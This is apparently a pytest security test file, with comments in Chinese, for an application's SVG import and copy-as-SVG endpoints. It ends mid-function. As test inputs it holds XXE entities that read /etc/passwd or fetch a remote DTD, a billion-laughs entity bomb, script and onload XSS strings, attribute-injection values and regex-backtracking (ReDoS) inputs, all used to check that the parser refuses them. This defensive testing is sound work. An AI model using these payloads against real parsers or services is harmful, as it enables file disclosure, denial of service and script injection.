"""外部 SVG 导入的安全边界（ADR 0189）：一组恶意样例，每一类都必须在换算之前被拦下（或被当成做不准、整个不拆）。

导入只经 `svgcheck.parse_svg(tolerant=True)`——与静态 SVG 素材、ADR 0182 场景解析同一个受限解析器；`tolerant` 只多删编辑器
私有命名空间与无作用的 CSS，下面每一条安全规则都不放宽。每条用例都核两件事：结局（拒绝码 / 原因码）对，结果里没有攻击载荷的
任何内容（不回显、没有对象）。变异反证见审阅页。
"""

from __future__ import annotations

import dataclasses
import json
import socket
import time

import pytest

from tavotto.rendercore import svgcheck, svgimport

SVG = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10">{}</svg>'


def outcome(text: str) -> tuple[str, str]:
    """('rejected', code) = 抛 SvgImportError；('unsupported', code) = 不拆、原因码；('ok', '') = 落成对象"""
    try:
        r = svgimport.import_svg(text)
    except svgimport.SvgImportError as e:
        return "rejected", e.code
    if r["unsupported"]:
        assert r["objects"] == [], "做不准的输入不许落成任何对象"
        return "unsupported", next(iter(r["unsupported"]))
    return "ok", ""


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    """任何一条样例都不许联网：碰到 socket 就当场失败"""

    def boom(*a, **k):
        raise AssertionError("导入时发起了网络连接")

    monkeypatch.setattr(socket, "create_connection", boom)
    monkeypatch.setattr(socket.socket, "connect", boom)


# ------------------------------------------------------------------ XXE / 十亿笑声
XXE_FILE = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text x="1" y="5">&x;</text></svg>'
)
XXE_HTTP = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY % p SYSTEM "http://example.invalid/evil.dtd"> %p;]>'
    '<svg xmlns="http://www.w3.org/2000/svg"/>'
)
LAUGHS = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "lol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
    '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">'
    '<!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">'
    '<!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;"><!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">'
    '<!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;"><!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><text x="1" y="5">&j;</text></svg>'
)


@pytest.mark.parametrize(
    "text", [XXE_FILE, XXE_HTTP, LAUGHS], ids=["xxe-file", "xxe-param-http", "billion-laughs"]
)
def test_dtd_and_entities_are_refused_before_expansion(text):
    t0 = time.monotonic()
    assert outcome(text) == ("unsupported", "external_ref")
    assert time.monotonic() - t0 < 5.0  # 没有展开（展开十亿笑声要几 GB、几十秒）


def test_public_svg_doctype_with_internal_subset_is_still_refused():
    text = (
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" '
        '[<!ENTITY x "y">]><svg xmlns="http://www.w3.org/2000/svg"/>'
    )
    assert outcome(text) == ("unsupported", "external_ref")


# ------------------------------------------------------------------ 外链
@pytest.mark.parametrize(
    "body",
    [
        '<image href="http://example.invalid/a.png" width="1" height="1"/>',
        '<image xlink:href="file:///etc/passwd" width="1" height="1"/>',
        '<use href="other.svg#a"/>',
        '<use xlink:href="https://example.invalid/x.svg#a"/>',
        '<rect width="1" height="1" fill="url(http://example.invalid/g.svg#g)"/>',
        '<rect width="1" height="1" style="fill:url(https://example.invalid/#g)"/>',
        '<style>rect{fill:url(http://example.invalid/#g)}</style><rect width="1" height="1"/>',
        '<image href="data:image/svg+xml;base64,PHN2Zy8+" width="1" height="1"/>',
        '<image href="data:text/html,%3Cscript%3E" width="1" height="1"/>',
    ],
    ids=[
        "image-http",
        "image-file",
        "use-relative",
        "use-https",
        "fill-url",
        "style-url",
        "css-url",
        "data-svg",
        "data-html",
    ],
)
def test_external_references_are_never_followed(body):
    assert outcome(SVG.format(body)) == ("unsupported", "external_ref")


# ------------------------------------------------------------------ use 递归、循环、指数展开
@pytest.mark.parametrize(
    "body",
    [
        '<g id="a"><use href="#a"/></g>',
        '<g id="a"><use href="#b"/></g><g id="b"><use href="#a"/></g>',
        '<linearGradient id="g1" href="#g2"/><linearGradient id="g2" href="#g1"/><rect width="1" height="1" fill="url(#g1)"/>',
    ],
    ids=["use-self", "use-mutual", "gradient-href-cycle"],
)
def test_reference_cycles_are_refused(body):
    assert outcome(SVG.format(body)) == ("unsupported", "reference_cycle")


def test_exponential_use_fanout_is_refused():
    # 每一层 use 上一层两次：20 层 = 2^20 个展开出来的元素，原文只有几十个
    body = (
        '<defs><rect id="l0" width="1" height="1"/>'
        + "".join(
            f'<g id="l{i}"><use href="#l{i - 1}"/><use href="#l{i - 1}"/></g>' for i in range(1, 21)
        )
        + '</defs><use href="#l20"/>'
    )
    assert outcome(SVG.format(body)) == ("rejected", "too_large")


# ------------------------------------------------------------------ 尺寸
@pytest.mark.parametrize(
    "attrs",
    [
        'width="100000000" height="10"',
        'width="20m" height="10"',
        'viewBox="0 0 1e30 1e30"',
        'viewBox="-1e12 0 10 10"',
        'width="inf" height="10"',
    ],
    ids=["width-px", "width-unit", "viewbox-huge", "viewbox-offset", "non-finite"],
)
def test_oversized_viewports_are_refused(attrs):
    text = f'<svg xmlns="http://www.w3.org/2000/svg" {attrs}><rect width="1" height="1"/></svg>'
    got = outcome(text)
    # 「inf」这类写法读不成数（长度解析退回缺省）也行，但不许落成一个巨大的对象
    if got[0] == "ok":
        r = svgimport.import_svg(text)
        assert max(r["size_mm"]) <= svgimport.MAX_VIEWPORT_MM
    else:
        assert got == ("rejected", "too_large")


def test_oversized_bytes_are_refused():
    text = SVG.format('<rect width="1" height="1"/>' + " " * (svgimport.MAX_BYTES + 1))
    assert outcome(text) == ("rejected", "too_large")


# ------------------------------------------------------------------ 脚本与事件
@pytest.mark.parametrize(
    "body,code",
    [
        ("<script>alert(1)</script>", "unsupported_element"),
        ('<script xlink:href="https://example.invalid/x.js"/>', "unsupported_element"),
        ('<rect width="1" height="1" onload="alert(1)"/>', "script"),
        ('<rect width="1" height="1" onclick="alert(1)"/>', "script"),
        ('<a href="javascript:alert(1)"><rect width="1" height="1"/></a>', "unsupported_element"),
        ('<rect width="1" height="1" style="fill:expression(alert(1))"/>', "external_ref"),
        (
            '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></body></foreignObject>',
            "unsupported_element",
        ),
        ('<set attributeName="onmouseover" to="alert(1)"/>', "unsupported_element"),
    ],
    ids=[
        "script",
        "script-src",
        "onload",
        "onclick",
        "javascript-link",
        "css-expression",
        "foreign-html",
        "animation-set",
    ],
)
def test_scripts_and_event_handlers_are_refused(body, code):
    text = SVG.format(body)
    assert outcome(text) == ("unsupported", code)
    assert "alert" not in json.dumps(svgimport.import_svg(text))


# ------------------------------------------------------------------ 深度、data:、超时
def test_deep_nesting_is_refused():
    body = (
        "<g>" * (svgimport.IMPORT_BUDGET.max_depth + 5)
        + '<rect width="1" height="1"/>'
        + "</g>" * (svgimport.IMPORT_BUDGET.max_depth + 5)
    )
    assert outcome(SVG.format(body)) == ("rejected", "too_large")


def test_nesting_just_under_the_limit_still_imports():
    n = svgimport.IMPORT_BUDGET.max_depth - 3
    body = "<g>" * n + '<rect width="1" height="1"/><rect width="1" height="1"/>' + "</g>" * n
    assert outcome(SVG.format(body)) == ("ok", "")


def test_data_uri_over_the_limit_is_refused():
    import base64
    import struct
    import zlib

    w = h = 8000  # 64 M 像素 > 导入预算的 40 M
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 0, 0, 0, 0)
    png = (
        b"\x89PNG\r\n\x1a\n"
        + struct.pack(">I", 13)
        + b"IHDR"
        + ihdr
        + struct.pack(">I", zlib.crc32(b"IHDR" + ihdr))
    )
    body = f'<image href="data:image/png;base64,{base64.b64encode(png).decode()}" width="1" height="1"/>'
    assert outcome(SVG.format(body)) == ("rejected", "too_large")


def test_data_uri_bytes_over_the_limit_are_refused():
    big = "A" * ((svgimport.IMPORT_BUDGET.max_image_bytes + 3) // 3 * 4 + 8)
    body = f'<image href="data:image/png;base64,{big}" width="1" height="1"/>'
    assert outcome(SVG.format(body)) == ("rejected", "too_large")


def test_conversion_stops_at_the_deadline(monkeypatch):
    monkeypatch.setattr(svgimport, "DEADLINE_S", -1.0)
    assert outcome(SVG.format('<rect width="1" height="1"/>')) == ("rejected", "timeout")


def test_the_import_parser_is_the_shared_bounded_parser(monkeypatch):
    """只有一个受限解析器：导入经 `svgcheck.parse_svg`，不另起一个 XML 解析器"""
    seen = []
    real = svgcheck.parse_svg

    def spy(data, **kw):
        seen.append(kw)
        return real(data, **kw)

    monkeypatch.setattr(svgcheck, "parse_svg", spy)
    svgimport.import_svg(SVG.format('<rect width="1" height="1"/>'))
    assert seen and seen[0]["tolerant"] is True and seen[0]["budget"] is svgimport.IMPORT_BUDGET


def test_endpoint_never_echoes_the_payload():
    from tavotto import app as m

    m.app.config["TESTING"] = True
    client = m.app.test_client()
    body = client.post("/api/svg/import", json={"svg": XXE_FILE}).get_json()
    assert (
        body["ok"] is True and body["objects"] == [] and body["unsupported"] == {"external_ref": 1}
    )
    body = client.post(
        "/api/svg/import", json={"svg": SVG.format("<script>steal()</script>")}
    ).get_json()
    assert "steal" not in json.dumps(body)


def test_expansion_is_bounded_again_while_converting(monkeypatch):
    """纵深防御：就算解析器那一道展开计数漏了（这里把它关掉），换算时逐元素计数也会在上限处停下。
    上限临时调到 5000：默认 20 万在慢的解释器上（CI 的 3.10 约 10 s）会先撞上 5 s 墙钟、报 timeout——那也是拒，
    但这条要单测「逐元素计数」这一道，不能让墙钟抢先"""
    monkeypatch.setattr(svgcheck, "_references", lambda *a, **k: None)
    monkeypatch.setattr(
        svgimport,
        "IMPORT_BUDGET",
        dataclasses.replace(svgimport.IMPORT_BUDGET, max_expanded_elements=5000),
    )
    body = (
        '<defs><rect id="l0" width="1" height="1"/>'
        + "".join(
            f'<g id="l{i}"><use href="#l{i - 1}"/><use href="#l{i - 1}"/></g>' for i in range(1, 21)
        )
        + '</defs><use href="#l20"/>'
    )
    t0 = time.monotonic()
    assert outcome(SVG.format(body)) == ("rejected", "too_many_elements")
    assert time.monotonic() - t0 < svgimport.DEADLINE_S + 1


# ================================================================== 复制为 SVG 接口的输入
# 输入是导出载荷（JSON），没有 XML 解析器可攻击；要守的是：载荷里的字符串不能变成输出 SVG 里的结构（实体、脚本、外链），
# 输出一定能过**严格**的受限解析器；尺寸 / 数量 / 嵌套 / 字节有上限，超出的在花力气之前就拒。


def _client():
    from tavotto import app as m

    m.app.config["TESTING"] = True
    return m.app.test_client()


def _text(text: str, **over) -> dict:
    o = {
        "type": "text", "id": "t", "x_mm": 1, "y_mm": 1, "w_mm": 40, "h_mm": 8, "text": text,
        "size_pt": 10, "bold": False, "italic": False, "color": "#000000", "align": "left",
    }  # fmt: skip
    o.update(over)
    return o


def _rect(**over) -> dict:
    o = {
        "type": "shape", "shape": "rect", "id": "r", "x_mm": 0, "y_mm": 0, "w_mm": 5, "h_mm": 5,
        "stroke_pt": 1, "color": "#000000", "fill": "#ff0000",
    }  # fmt: skip
    o.update(over)
    return o


def _copy(objs, w=50, h=30, raw: bytes | None = None):
    c = _client()
    if raw is not None:
        return c.post("/api/svg/copy", data=raw, content_type="application/json")
    return c.post("/api/svg/copy", json={"objects": objs, "w_mm": w, "h_mm": h})


@pytest.mark.parametrize(
    "payload",
    [
        '<!DOCTYPE x [<!ENTITY a SYSTEM "file:///etc/passwd">]>&a;',
        '&lol;&lol;&lol;<!ENTITY lol "lol">',
        "</text><script>alert(1)</script><text>",
        '<image href="http://example.invalid/x.png"/>',
        "]]><svg onload=alert(1)>",
        '<use xlink:href="#t"/><g id="t"><use href="#t"/></g>',
    ],
    ids=["xxe", "entities", "script", "external-image", "cdata-onload", "use-cycle"],
)
def test_copy_text_payloads_never_become_svg_structure(payload):
    r = _copy([_text(payload, w_mm=400)], w=420)  # 一行放得下：粘回来是一个文字对象
    body = r.get_json()
    assert r.status_code == 200 and body["ok"] is True
    # 输出过严格的受限解析器：没有 DTD / 实体 / 脚本 / 事件 / 外链 / 引用环
    root = svgcheck.parse_svg(body["svg"].encode())
    tags = {el.tag.split("}")[-1] for el in root.iter()}
    assert not tags & {"script", "image", "use", "foreignObject", "a"}
    # 再粘回来：那段字原样是一个文字对象的内容
    back = svgimport.import_svg(body["svg"])
    assert back["unsupported"] == {}
    texts = [o["text"] for o in back["objects"] if o["type"] == "text"]
    assert texts == [" ".join(payload.split())]


@pytest.mark.parametrize(
    "over",
    [
        {"color": "url(http://example.invalid/#g)"},
        {"fill": "url(https://example.invalid/#g)"},
        {"fill": "javascript:alert(1)"},
        {"color": '#000000" onload="alert(1)'},
    ],
    ids=["color-url", "fill-url", "fill-javascript", "attr-injection"],
)
def test_copy_style_strings_cannot_inject_references(over):
    r = _copy([_rect(**over)])
    body = r.get_json()
    if body.get("ok"):
        root = svgcheck.parse_svg(body["svg"].encode())
        assert "example.invalid" not in body["svg"] and "alert" not in body["svg"]
        assert all(not k.lower().startswith("on") for el in root.iter() for k in el.attrib)
    else:
        assert body["error"] in ("bad_object", "bad_objects")


@pytest.mark.parametrize(
    "w,h",
    [(1e9, 10), (10, 1e9), (0, 10), (-5, 10), (float("inf"), 10), (float("nan"), 10)],
    ids=["huge-w", "huge-h", "zero", "negative", "inf", "nan"],
)
def test_copy_oversized_page_is_refused(w, h):
    import json as _json

    raw = _json.dumps({"objects": [_rect()], "w_mm": w, "h_mm": h}).encode()
    assert _copy(None, raw=raw).status_code == 400


def test_copy_oversized_objects_are_refused_before_rendering():
    huge = _rect(x_mm=0, y_mm=0, w_mm=1e12, h_mm=1e12)
    r = _copy([huge])
    assert r.status_code in (200, 400)
    body = r.get_json()
    assert body.get("ok") is False or len(body["svg"]) < 100_000


def test_copy_deep_clip_nesting_is_refused():
    from tavotto import app as m

    mask = {"type": "path", "x_mm": 0, "y_mm": 0, "w_mm": 5, "h_mm": 5,
            "subpaths": [{"closed": True, "nodes": [{"p": [0, 0]}, {"p": [1, 0]}, {"p": [1, 1]}]}]}  # fmt: skip
    ok = _copy([_rect(clip=[mask] * m.SVG_COPY_MAX_CLIP_DEPTH)])
    assert ok.status_code == 200 and ok.get_json()["ok"] is True
    assert _copy([_rect(clip=[mask] * (m.SVG_COPY_MAX_CLIP_DEPTH + 1))]).status_code == 413


def test_copy_too_many_objects_nodes_or_characters_are_refused():
    from tavotto import app as m

    assert _copy([_rect()] * (m.SVG_COPY_MAX_OBJECTS + 1)).status_code == 413
    nodes = [{"p": [i / 1000, (i % 7) / 7]} for i in range(m.SVG_COPY_MAX_NODES + 1)]
    path = {"type": "path", "x_mm": 0, "y_mm": 0, "w_mm": 5, "h_mm": 5, "stroke_pt": 1,
            "color": "#000000", "fill": None, "subpaths": [{"closed": False, "nodes": nodes}]}  # fmt: skip
    assert _copy([path]).status_code == 413
    assert _copy([_text("x" * (m.SVG_COPY_MAX_TEXT + 1))]).status_code == 413


def test_copy_oversized_request_bytes_are_refused_before_parsing():
    """data: 之类塞大字节的载荷：按 Content-Length 在解析 JSON 之前就拒（不读、不解析）"""
    from tavotto import app as m

    raw = b'{"objects": [], "pad": "' + b"A" * (m.SVG_COPY_MAX_BYTES + 1) + b'"}'
    t0 = time.monotonic()
    assert _copy(None, raw=raw).status_code == 413
    assert time.monotonic() - t0 < 10.0


def test_copy_at_the_limits_finishes_in_bounded_time():
    """上限之内最重的一类输入（对象数顶格）也在有限时间里写完——超时靠上限兜住，不靠杀线程"""
    from tavotto import app as m

    t0 = time.monotonic()
    r = _copy([_rect(x_mm=i % 40, y_mm=i // 40) for i in range(m.SVG_COPY_MAX_OBJECTS)], w=60, h=60)
    assert r.status_code == 200 and r.get_json()["ok"] is True
    assert time.monotonic() - t0 < 30.0


def test_outline_text_length_is_bounded():
    from tavotto import app as m

    c = _client()
    r = c.post("/api/text/outline", json={"objects": [_text("x" * (m.SVG_COPY_MAX_TEXT + 1))]})
    assert r.status_code == 413


# ---- Codex 线程 4614436889 / 4614436909：CSS 清理的回溯正则、单条路径内的预算 ----


def test_iter_rules_matches_regex_semantics():
    """线性扫描与原来的 `_RULE.finditer` 同一语义（随机花括号串对照）"""
    import random

    rng = random.Random(7)
    for _ in range(3000):
        css = "".join(rng.choice("ab {};:\n") for _ in range(rng.randint(0, 24)))
        want = [(m.start(), m.end(), m.group(1), m.group(2)) for m in svgcheck._RULE.finditer(css)]
        assert list(svgcheck._iter_rules(css)) == want, css


def test_style_without_braces_is_linear_time():
    """`<style>` 里一大段没有花括号的文字：以前 `_RULE.sub` 平方级回溯（4 万字符超 15 秒），现在线性"""
    for n in (40_000, 60_000):
        text = SVG.format("<style>" + "a" * n + "</style>")
        t0 = time.monotonic()
        outcome(text)
        assert time.monotonic() - t0 < 10.0, n


def test_style_stripped_inert_still_works_after_linear_scan():
    out = svgcheck.parse_svg(
        SVG.format("<style>.a{overflow:hidden;fill:red}</style>").encode(), tolerant=True
    )
    css = next(el.text for el in out.iter() if el.tag.endswith("style"))
    assert css == ".a{fill:red}"


def test_single_path_anchor_budget():
    """一条 `d` 塞几十万段：超锚点上限就拒绝，而且耗时有界"""
    d = "M0 0" + " L1 1" * (svgimport.MAX_ANCHORS + 10)
    t0 = time.monotonic()
    assert outcome(SVG.format(f'<path d="{d}" fill="red"/>')) == ("rejected", "too_many_elements")
    assert time.monotonic() - t0 < svgimport.DEADLINE_S


def test_anchor_budget_shared_across_use_references(monkeypatch):
    """重复引用同一条路径不能绕过预算：总锚点跨整次导入共享"""
    monkeypatch.setattr(svgimport, "DEADLINE_S", 120.0)  # 机器忙时别让墙钟抢在锚点预算前面
    n = svgimport.MAX_ANCHORS // 8
    d = "M0 0" + " L1 1" * n
    uses = "".join('<use href="#p"/>' for _ in range(10))
    text = SVG.format(f'<defs><path id="p" d="{d}" fill="red"/></defs>{uses}')
    assert outcome(text) == ("rejected", "too_many_elements")


def test_single_path_deadline(monkeypatch):
    """deadline 已过时，单条路径内部也会中断（不只在进入元素时查）"""
    d = "M0 0" + " L1 1" * 5000
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport.parse_path_d(d, deadline=time.monotonic() - 1)
    assert e.value.code == "timeout"


# ---- CodeQL py/polynomial-redos：transform 与 !important 的扫描必须线性 ----


@pytest.mark.parametrize(
    "s",
    [
        "a" * 60_000,
        "A(" + "(" * 60_000,
        "translate(" + "(" * 60_000,
        " " * 60_000 + "translate(1 2)",
    ],
    ids=["letters", "A-parens", "name-parens", "spaces"],
)
def test_parse_transform_pathological_input_is_linear_time(s):
    t0 = time.monotonic()
    svgimport.parse_transform(s)
    assert time.monotonic() - t0 < 5.0


def test_parse_transform_semantics_unchanged():
    assert svgimport.parse_transform("translate(1 2) scale(3)") == (3, 0, 0, 3, 1, 2)
    assert svgimport.parse_transform("  translate (5)") == (1, 0, 0, 1, 5, 0)
    assert svgimport.parse_transform("translate(1 2") == svgimport.IDENTITY  # 没有右括号：忽略


def test_important_stripping_is_linear_time_and_keeps_semantics():
    t0 = time.monotonic()
    out = svgimport._parse_decls("fill:" + " " * 60_000 + "red")
    assert out == {"fill": "red"}
    assert time.monotonic() - t0 < 5.0
    assert svgimport._parse_decls("fill: red !important")["fill"] == "red"
    assert svgimport._parse_decls("fill: red !important  ")["fill"] == "red"
    t0 = time.monotonic()
    svgimport._parse_decls("fill:red" + " " * 60_000 + "!imp")
    assert time.monotonic() - t0 < 5.0


# ---- Codex 线程 4656678185：长度 / 数值正则的歧义回溯 ----


@pytest.mark.parametrize("n", [20_000, 40_000])
@pytest.mark.parametrize("attr", ["width", "height"])
def test_length_with_long_digit_run_is_linear_time(attr, n):
    """`width="999…9!"`：原来的 `\\d+\\.?\\d*` 有歧义，2 万位就要十几秒"""
    text = f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" {attr}="{"9" * n}!"/>'
    t0 = time.monotonic()
    outcome(text)
    assert time.monotonic() - t0 < 5.0


def test_length_semantics_unchanged_and_overlong_token_is_invalid():
    assert svgimport._length("10") == 10
    assert svgimport._length("1.5e1px") == 15
    assert svgimport._length(".5in") == 48
    assert svgimport._length("5.") == 5
    assert svgimport._length("50%", ref=200) == 100
    assert svgimport._length("9" * 100, default=7) == 7  # 数值 token 过长 = 非法
    assert svgimport._length("9" * 100 + "!", default=7) == 7
    assert svgimport._nums("1 2.5 .5 -3e2") == [1, 2.5, 0.5, -300]
    assert svgimport._nums("1 " + "9" * 100) == []
    assert svgimport.parse_path_d("M0 0 L" + "9" * 100 + " 1") == []
    assert len(svgimport.parse_path_d("M0 0 L1 1")[0]["nodes"]) == 2


def test_number_regex_is_unambiguous_on_pathological_runs():
    for s in ("9" * 40_000 + "!", "1." * 20_000, "1e" * 20_000, "+-" * 20_000):
        t0 = time.monotonic()
        svgimport._LENGTH_RE.match(s)
        svgimport._NUM_RE.findall(s)
        assert time.monotonic() - t0 < 5.0


# ---- Codex 线程 4656678188：墙钟从入口起算，CSS 扫描不再平方级 ----


def test_many_tiny_css_rules_are_refused_within_the_wall_clock():
    """`<style>` 里 32 万条 `a{}`（约 960 KB）：原来 7 秒后成功返回，现在超规则数上限直接拒绝"""
    t0 = time.monotonic()
    got = outcome(SVG.format("<style>" + "a{}" * 320_000 + "</style>"))
    assert got in (("rejected", "too_large"), ("rejected", "timeout")), got
    assert time.monotonic() - t0 < svgimport.DEADLINE_S


def test_stylesheet_scan_is_linear_in_rule_count():
    """不再 `css[pos:].strip()` 逐条复制剩余全文：120 万条短规则的扫描应在 2 秒内"""
    css = "a{}" * 1_200_000
    t0 = time.monotonic()
    assert svgcheck._stylesheet(css) == []
    assert time.monotonic() - t0 < 10.0


def test_small_stylesheets_still_apply():
    text = SVG.format(
        '<style>.a{fill:red}\n  rect{stroke:blue}  </style><rect class="a" width="5" height="5"/>'
    )
    r = svgimport.import_svg(text)
    assert not r["unsupported"] and r["objects"][0]["fill"] == "#ff0000"
    assert svgcheck._stylesheet("  a{fill:red} \n b{fill:blue}  \n") == []


def test_stylesheet_rule_cap_and_deadline_are_enforced():
    with pytest.raises(svgcheck.SVGError) as e:
        svgcheck._stylesheet("a{}" * 11, 10)
    assert e.value.code == "svg_resource_limit"
    with pytest.raises(svgcheck.SVGError) as e:
        svgcheck._stylesheet("a{}" * 1000, None, time.monotonic() - 1)
    assert e.value.code == "svg_timeout"


def test_parse_svg_checks_the_deadline_while_parsing_and_validating():
    past = time.monotonic() - 1
    for body in ("<g/>" * 5000, "<style>" + "a{}" * 5000 + "</style>"):
        for tolerant in (False, True):
            with pytest.raises(svgcheck.SVGError) as e:
                svgcheck.parse_svg(SVG.format(body).encode(), tolerant=tolerant, deadline=past)
            assert e.value.code == "svg_timeout"
    # 不给 deadline 时行为不变
    svgcheck.parse_svg(SVG.format("<g/>" * 5000).encode(), tolerant=True)


def test_import_deadline_starts_at_entry_and_covers_parsing_and_css(monkeypatch):
    seen = {}
    real = svgcheck.parse_svg

    def spy(data, **kw):
        seen.update(kw)
        return real(data, **kw)

    monkeypatch.setattr(svgcheck, "parse_svg", spy)
    t0 = time.monotonic()
    svgimport.import_svg(SVG.format('<rect width="1" height="1"/>'))
    assert t0 < seen["deadline"] <= time.monotonic() + svgimport.DEADLINE_S
    # parse_css 自己也会超时
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport.parse_css("a{}" * 1000, {}, 0, time.monotonic() - 1)
    assert e.value.code == "timeout"
    # 解析阶段超时 -> timeout（不是 bad_xml / 做不准）
    monkeypatch.setattr(svgimport, "DEADLINE_S", -1.0)
    assert outcome("<svg xmlns='http://www.w3.org/2000/svg'><g/></svg>") == ("rejected", "timeout")


# ---- Codex 线程 4656678190：polyline / polygon 等几何分支也要扣共享锚点预算 ----


@pytest.mark.parametrize("tag", ["polyline", "polygon"])
def test_polyline_and_polygon_count_against_the_anchor_budget(tag, monkeypatch):
    """单个 `<polyline points>` 30 万个点：原来成功导入 60 万锚点，现在拒绝"""
    monkeypatch.setattr(svgimport, "DEADLINE_S", 120.0)  # 慢机器上别让墙钟抢在预算前面
    pts = "0,0 1,1 " * 300_000
    t0 = time.monotonic()
    got = outcome(SVG.format(f'<{tag} points="{pts}" fill="red"/>'))
    assert got == ("rejected", "too_many_elements"), got
    assert time.monotonic() - t0 < 5.0


def test_polyline_just_under_the_budget_still_imports():
    pts = "0,0 1,1 " * 1000
    r = svgimport.import_svg(SVG.format(f'<polyline points="{pts}" fill="none" stroke="red"/>'))
    assert not r["unsupported"] and len(r["objects"]) == 1
    assert len(svgimport.import_svg(SVG.format('<polygon points="0,0 5,0 5,5"/>'))["objects"]) == 1


def test_use_of_a_big_polyline_is_charged_every_time(monkeypatch):
    monkeypatch.setattr(svgimport, "DEADLINE_S", 120.0)
    pts = "0,0 1,1 " * 10_000  # 2 万个锚点；引用 10 次 = 20 万 > 10 万
    text = SVG.format(
        f'<defs><polyline id="p" points="{pts}" fill="none" stroke="red"/></defs>'
        + '<use href="#p"/>' * 10
    )
    assert outcome(text) == ("rejected", "too_many_elements")


def test_use_of_simple_shapes_is_charged_every_time(monkeypatch):
    """rect / circle / line 这类固定锚点的分支同样累计"""
    monkeypatch.setattr(svgimport, "DEADLINE_S", 120.0)
    for shape in ('<rect id="p" width="1" height="1"/>', '<circle id="p" r="1"/>'):
        text = SVG.format(f"<defs>{shape}</defs>" + '<use href="#p"/>' * 30_000)
        assert outcome(text) == ("rejected", "too_many_elements"), shape


def test_geometry_branches_check_the_deadline():
    from xml.etree import ElementTree as ET

    ctx = svgimport._Ctx(ids={}, rules=[], deadline=time.monotonic() - 1)
    el = ET.fromstring('<polyline points="0,0 1,1"/>')
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport._geometry(el, "polyline", ctx)
    assert e.value.code == "timeout"


def test_tolerant_cleanup_of_many_siblings_is_linear():
    """容错清理逐个 `parent.remove(child)` 是平方级（Codex 线程 4656770810）：同一父节点下 2 万个保留节点后跟 2 万个 metadata，
    原来约 9 秒才报 timeout；一趟过滤后应在 1.5 秒内结束，且不是超时"""
    body = "<g/>" * 20_000 + "<metadata/>" * 20_000
    t0 = time.monotonic()
    got = outcome(SVG.format(body))
    assert time.monotonic() - t0 < 7.5
    assert got != ("rejected", "timeout")


def test_tolerant_cleanup_keeps_order_and_drops_metadata_and_foreign_nodes():
    root = svgcheck.parse_svg(
        (
            '<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="urn:editor" viewBox="0 0 10 10">'
            '<rect id="a" width="1" height="1"/><metadata/><x:private/>'
            '<circle id="b" r="1"/><metadata/><rect id="c" width="1" height="1"/></svg>'
        ).encode(),
        budget=svgimport.IMPORT_BUDGET,
        tolerant=True,
    )
    assert [c.get("id") for c in root] == ["a", "b", "c"]


# ---- Codex 线程 4656811246：每个子路径的起点也是锚点 ----


def test_every_subpath_start_is_charged_to_the_anchor_budget(monkeypatch):
    """`M0 0 L1 1 ` 重复 10 万次 = 20 万锚点：原来起点不计费，成功返回超过 MAX_ANCHORS 的结果"""
    monkeypatch.setattr(svgimport, "DEADLINE_S", 120.0)
    d = "M0 0 L1 1 " * 100_000
    assert outcome(SVG.format(f'<path d="{d}" fill="red"/>')) == ("rejected", "too_many_elements")
    # 只有 M 也一样（每个 M 一个锚点）
    d = "M0 0 " * (svgimport.MAX_ANCHORS + 10)
    assert outcome(SVG.format(f'<path d="{d}" fill="red"/>')) == ("rejected", "too_many_elements")


def test_parse_path_d_counts_the_subpath_start():
    assert len(svgimport.parse_path_d("M0 0 L1 1", max_anchors=2)[0]["nodes"]) == 2
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport.parse_path_d("M0 0 L1 1", max_anchors=1)
    assert e.value.code == "too_many_elements"
    with pytest.raises(svgimport.SvgImportError):
        svgimport.parse_path_d("M0 0 M1 1 M2 2", max_anchors=2)


def test_geometry_total_is_checked_against_the_limit_not_only_added():
    """`_geometry` 对 path 分支累计之后也要查上限（以前只加数）"""
    from xml.etree import ElementTree as ET

    ctx = svgimport._Ctx(ids={}, rules=[], deadline=time.monotonic() + 60)
    ctx.anchors = svgimport.MAX_ANCHORS - 1
    el = ET.fromstring('<path d="M0 0"/>')
    svgimport._geometry(el, "path", ctx)  # 刚好到上限：不报
    with pytest.raises(svgimport.SvgImportError) as e:
        svgimport._geometry(ET.fromstring('<path d="M0 0"/>'), "path", ctx)
    assert e.value.code == "too_many_elements"


# ---- Codex 线程 4656811230：parse_css 的规则扫描必须线性 ----


def _old_parse_css_rules(text: str):
    import re

    return re.findall(r"([^{}]+)\{([^{}]*)\}", text)


def test_parse_css_trailing_whitespace_is_linear():
    """`a{}` 后接大量空格（svgcheck 接受尾部空白）：原来 findall 在每个空白起点重试，4 万个空格 13 秒"""
    text = "a{}" + " " * 60_000
    t0 = time.monotonic()
    rules = svgimport.parse_css(text, {}, 0, time.monotonic() + 5)
    assert time.monotonic() - t0 < 10.0
    assert len(rules) == 1


def test_parse_css_matches_the_old_regex_on_random_input():
    import random

    rng = random.Random(11)
    for _ in range(2000):
